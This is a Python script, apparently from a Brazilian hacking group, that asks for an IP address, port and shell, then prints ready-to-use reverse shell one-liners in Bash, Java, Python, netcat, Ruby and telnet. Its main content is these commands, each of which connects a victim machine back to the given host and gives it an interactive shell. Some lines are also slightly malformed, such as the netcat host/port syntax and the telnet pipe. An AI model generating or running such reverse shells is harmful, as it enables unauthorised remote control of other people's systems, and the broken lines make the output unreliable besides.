import os, progressbar, time
from colorama import init, Fore, Back, Style
init(autoreset=True)

def animated_marker():
    widgets = ['\033[94m[\033[97m#\033[94m]\033[97mLoading: ', progressbar.AnimatedMarker()]
    bar = progressbar.ProgressBar(widgets=widgets).start()

    for i in range(50):
        time.sleep(0.1)
        bar.update(i)

os.system('cls|clear')
print("""
            \033[94m [ \033[0m \033[1;37;41mTekShell generator reverse shell \033[0m \033[94m ] \033[0m
            
\033[1;49;35m████████╗███████╗██╗  ██╗\033[4;49;96m███████╗██╗  ██╗███████╗██╗     ██╗\033[0m
\033[1;49;35m╚══██╔══╝██╔════╝██║ ██╔╝\033[4;49;96m██╔════╝██║  ██║██╔════╝██║     ██║\033[0m
\033[1;49;35m   ██║   █████╗  █████╔╝ \033[4;49;96m███████╗███████║█████╗  ██║     ██║\033[0m
\033[1;49;35m   ██║   ██╔══╝  ██╔═██╗ \033[4;49;96m╚════██║██╔══██║██╔══╝  ██║     ██║\033[0m
\033[1;49;35m   ██║   ███████╗██║  ██╗\033[4;49;96m███████║██║  ██║███████╗███████╗███████╗\033[0m
\033[1;49;35m   ╚═╝   ╚══════╝╚═╝  ╚═╝\033[4;49;96m╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝\033[0m
            \033[1;37;41mCodded By: CharseSec\033[0m - \033[1;37;41mLybeSec Group\033[0m""")
print("")
print("\033[97m╔══════════════════════════════════════════════╗")
print("")
ext = input("\033[1;37;41mQUAL ENDERECO? >>\033[0m")
print("")
print("\033[97m╔══════════════════════════════════════════════╗")
print("")
port = input("\033[1;37;41mDIGITE A PORTA >>\033[0m")
print("")
print("\033[97m╔══════════════════════════════════════════════╗")
print("")
print(""" \033[1;49;35m[ x ] \033[4;49;96m/bin/sh\033[0m
 \033[1;49;35m[ x ] \033[4;49;96m/bin/bash\033[0m
 \033[1;49;35m[ x ] \033[4;49;96m/bin/zsh\033[0m
 \033[1;49;35m[ x ] \033[4;49;96m/bin/ksh\033[0m
 \033[1;49;35m[ x ] \033[4;49;96m/bin/tcsh\033[0m
 \033[1;49;35m[ x ] \033[4;49;96m/bin/dash\033[0m""")
print("")
print("\033[97m╚══════════════════════════════════════════════╝ ")
print("")
shell = input("\033[1;37;41mDIGITE A SHELL COMO OS EXEMPLOS ACIMA >>\033[0m")
animated_marker()
               
os.system('cls|clear')
print("""
            \033[94m [ \033[0m \033[1;37;41mTekShell generator reverse shell \033[0m \033[94m ] \033[0m
            
\033[1;49;35m████████╗███████╗██╗  ██╗\033[4;49;96m███████╗██╗  ██╗███████╗██╗     ██╗\033[0m
\033[1;49;35m╚══██╔══╝██╔════╝██║ ██╔╝\033[4;49;96m██╔════╝██║  ██║██╔════╝██║     ██║\033[0m
\033[1;49;35m   ██║   █████╗  █████╔╝ \033[4;49;96m███████╗███████║█████╗  ██║     ██║\033[0m
\033[1;49;35m   ██║   ██╔══╝  ██╔═██╗ \033[4;49;96m╚════██║██╔══██║██╔══╝  ██║     ██║\033[0m
\033[1;49;35m   ██║   ███████╗██║  ██╗\033[4;49;96m███████║██║  ██║███████╗███████╗███████╗\033[0m
\033[1;49;35m   ╚═╝   ╚══════╝╚═╝  ╚═╝\033[4;49;96m╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝\033[0m
            \033[1;37;41mCodded By: CharseSec\033[0m - \033[1;37;41mLybeSec Group\033[0m""")

print("\033[97m╔══════════════════════════════════════════════╗")
print("")
print(f""" \033[1;49;35m[ + ] \033[4;49;96mBASH\033[0m
bash -i >& /dev/tcp/{ext}/{port} 0>&1

 \033[1;49;35m[ + ] \033[4;49;96mJAVA\033[0m
r = Runtime.getRuntime()
p = r.exec(["{shell}","-c","exec 5<>/dev/tcp/{ext}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

 \033[1;49;35m[ + ] \033[4;49;96mPYTHON\033[0m
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ext}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["{shell}","-i"]);'

 \033[1;49;35m[ + ] \033[4;49;96mNC-PLAIN\033[0m
nc -e {shell} {ext}/{port}

 \033[1;49;35m[ + ] \033[4;49;96mNC-MKFIFO\033[0m
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ext} {port} >/tmp/f

 \033[1;49;35m[ + ] \033[4;49;96mRUBY\033[0m
ruby -rsocket -e'f=TCPSocket.open("{ext}",{port}).to_i;exec sprintf("{shell}-i <&%d >&%d 2>&%d",f,f,f)'

 \033[1;49;35m[ + ] \033[4;49;96mTELNET\033[0m
rm -f /tmp/p; mknod /tmp/p p && telnet {ext} {port} 0/tmp/p
""")
print("")
print("\033[97m╚══════════════════════════════════════════════╝ ")